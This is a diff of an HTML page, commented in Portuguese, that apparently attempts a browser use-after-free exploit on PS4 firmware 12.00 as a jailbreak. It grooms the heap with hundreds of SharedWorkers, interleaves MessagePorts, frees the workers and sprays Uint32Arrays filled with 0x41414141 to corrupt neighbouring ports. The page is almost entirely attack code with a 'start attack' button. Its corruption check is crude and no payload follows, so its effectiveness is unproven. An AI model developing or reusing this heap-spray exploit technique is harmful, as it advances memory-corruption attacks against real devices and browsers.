@@ -2,128 +2,141 @@
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
-    <title>PS4 12.00 MessagePort UAF</title>
+    <title>PS4 12.00 Precision Port UAF</title>
    
 </head>
 <body>
 
-    <h1>PS4 12.00 - MESSAGE PORT CORRUPTION</h1>
-    <h3>Estratégia: SharedWorker -> MessagePort Overlap</h3>
+    <h1>PS4 12.00 - PRECISION PORT ATTACK</h1>
+    <h3>Limite Rígido: 404 Workers (Zona Segura)</h3>
     <div id="status">Pronto.</div>
     <div id="log"></div>
     <br>
-    <button onclick="run_port_exploit()">INICIAR ATAQUE</button>
+    <button onclick="run_precision()">INICIAR (LIMITE 404)</button>
 
     <script>
-        function log(msg, type="") {
+        function log(msg, type="info") {
             var d = document.getElementById("log");
             d.innerHTML += `<div class="${type}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             d.scrollTop = d.scrollHeight;
         }
 
         // =================================================================
-        // 1. O CORRUPTOR (OBJETO FALSO)
+        // 1. O CORRUPTOR (SPRAY)
         // =================================================================
-        function build_fake_port() {
+        function build_fake_obj() {
             var size = 0x400; 
             var buffer = new Uint32Array(size / 4);
-            
-            // Simular uma estrutura de Porta Corrompida
-            // Preenchemos com 0x41414141
-            // Se conseguirmos ler "AAAA" de uma porta viva, ganhamos.
-            buffer.fill(0x41414141);
-            
+            // Padrão visual para detectar corrupção
+            // 0x41414141 = AAAA
+            buffer.fill(0x41414141); 
             return buffer;
         }
 
         // =================================================================
-        // 2. EXECUÇÃO
+        // 2. EXECUÇÃO CONTROLADA
         // =================================================================
-        var channels = [];
-        var workers = [];
-        var fake_obj = build_fake_port();
+        var sandwich_stack = []; // Guarda pares {worker, port}
+        var filler_workers = [];
 
-        async function run_port_exploit() {
+        async function run_precision() {
             if(!window.SharedWorker) return log("Navegador incompatível.");
             
-            log("Fase 1: Criando emaranhado de Portas e Workers...");
+            var payload = build_fake_obj();
             
-            // Tática: Criar muitos canais e workers intercalados
-            // [Worker] [PortA] [PortB] [Worker] [PortC] [PortD] ...
+            // FASE 1: BASE GROOMING (0 até 390)
+            // Enchemos a memória, mas deixamos espaço para o sanduíche final
+            log("Fase 1: Base Grooming (0-390)...");
             
-            for(let i=0; i < 500; i++) {
+            for(let i=0; i < 390; i++) {
                 try {
-                    // 1. Cria Worker
-                    let w = new SharedWorker("data:text/javascript,1", "w"+i);
+                    let w = new SharedWorker("data:text/javascript,1", "base_"+i);
                     w.port.start();
-                    workers.push(w);
-
-                    // 2. Cria Canal (2 Portas)
-                    let mc = new MessageChannel();
-                    // Adicionamos propriedades para identificar depois
-                    mc.port1.id = i;
-                    mc.port2.id = i;
-                    channels.push(mc);
-
+                    filler_workers.push(w);
                 } catch(e){}
-                
-                if(i%50==0) log(`Alocados: ${i}`);
             }
+            log("Base pronta. Entrando na Zona Mista (390-404)...");
 
-            log("Fase 2: Trigger & Spray (Corrupção de Porta)...");
+            // FASE 2: CONSTRUÇÃO DO SANDUÍCHE (390 até 404)
+            // Aqui alternamos Worker/Porta para maximizar a chance de vizinhança
             
-            // Loop Reverso
-            var idx = workers.length - 1;
-            var found = false;
+            var p_count = 0;
+            var max_sandwich = 14; // 390 + 14 = 404
 
-            var timer = setInterval(() => {
-                if(idx < 300 || found) { // Paramos antes do fim para não quebrar tudo
-                    clearInterval(timer);
-                    if(!found) log("Falha: Nenhuma porta corrompida.");
+            var interval = setInterval(() => {
+                if (p_count >= max_sandwich) {
+                    clearInterval(interval);
+                    trigger_attack(payload); // Dispara no último (404)
                     return;
                 }
 
-                // A. Libera Worker
-                var victim = workers[idx];
-                victim.port.close();
-                workers[idx] = null;
-
-                // B. Spray Imediato (Tenta ocupar o lugar do Worker)
-                // Se o Worker e a Porta estiverem no mesmo Slab, o spray pode
-                // sobrescrever os dados da Porta vizinha (channels[idx]).
-                var spray = [];
-                for(let k=0; k<40; k++) {
-                    spray.push(new Uint32Array(fake_obj));
-                }
-
-                // C. VERIFICAÇÃO
-                // Tentamos ver se a porta vizinha mudou de comportamento
-                // Uma porta corrompida pode falhar ao enviar mensagem ou mudar propriedades
-                var target = channels[idx];
                 try {
-                    // Teste 1: A porta ainda está viva?
-                    // Teste 2: Se enviarmos mensagem, ela volta corrompida?
+                    // 1. Cria MessageChannel (Portas A e B)
+                    var mc = new MessageChannel();
+                    mc.port1.id = p_count;
                     
-                    // Se o spray funcionou, a estrutura interna da porta virou 0x41414141
-                    // Tentar usar 'postMessage' deve causar comportamento estranho ou exceção específica
+                    // 2. Cria Worker (Vítima Potencial)
+                    var id = 391 + p_count;
+                    var w = new SharedWorker("data:text/javascript,1", "victim_"+id);
+                    w.port.start();
                     
-                    target.port1.postMessage("ping");
+                    // Guarda o par junto
+                    sandwich_stack.push({ worker: w, port: mc.port1, id: id });
                     
+                    log(`Sanduíche ${id}: Worker + Porta criados.`);
                 } catch(e) {
-                    // SE DER ERRO AQUI, PODE SER SINAL DE CORRUPÇÃO!
-                    log(`Evento na Porta ${idx}: ${e}`, "success");
-                    
-                    // Verifica se o erro é "Object is detached" ou similar
-                    // Se o ponteiro interno virou lixo, o browser acha que a porta morreu
-                    found = true;
-                    clearInterval(timer);
-                    log("!!! POTENCIAL CORRUPÇÃO DETECTADA !!!", "success");
-                    log("O spray sobrescreveu a estrutura da porta.", "success");
-                    alert("Jailbreak Triggered: Port Corruption!");
+                    log("Erro de alocação: " + e, "err");
+                }
+                
+                p_count++;
+            }, 200); // Lento para garantir ordem
+        }
+
+        function trigger_attack(payload) {
+            log("!!! ATINGIDO LIMITE 404. DISPARANDO !!!", "warn");
+            document.getElementById("status").innerText = "EXECUTANDO UAF...";
+
+            // Vamos atacar de trás para frente (do 404 para baixo)
+            // Focamos nos últimos 3, que são os mais instáveis/exploráveis
+            
+            var attempts = 0;
+            var attack_interval = setInterval(() => {
+                if (attempts >= 4 || sandwich_stack.length === 0) {
+                    clearInterval(attack_interval);
+                    log("Fim das tentativas. Se não houve Panic, verifique logs.");
+                    return;
                 }
 
-                idx--;
-            }, 20);
+                // Pega o par do topo (Worker 404, depois 403...)
+                var item = sandwich_stack.pop();
+                
+                log(`Atacando Worker ${item.id}...`);
+                
+                // 1. FREE (Libera Worker)
+                item.worker.port.close();
+                item.worker = null;
+
+                // 2. SPRAY IMEDIATO (Tenta corromper a Porta vizinha 'item.port')
+                var spray = [];
+                for(let k=0; k<1000; k++) {
+                    spray.push(new Uint32Array(payload));
+                }
+
+                // 3. CHECK (A porta vizinha morreu ou mudou?)
+                try {
+                    // Tenta enviar mensagem pela porta que estava "colada" no worker
+                    item.port.postMessage("ping");
+                    // Se passar, talvez não tenha corrompido ainda.
+                } catch(e) {
+                    // Se der erro, pode ser corrupção!
+                    log(`ERRO NA PORTA VIZINHA ${item.id}: ${e}`, "success");
+                    log("!!! POSSÍVEL SUCESSO !!!", "success");
+                    alert("Atenção: Comportamento anômalo detectado na Porta!");
+                    clearInterval(attack_interval);
+                }
+
+                attempts++;
+            }, 300);
         }
     </script>
 </body>
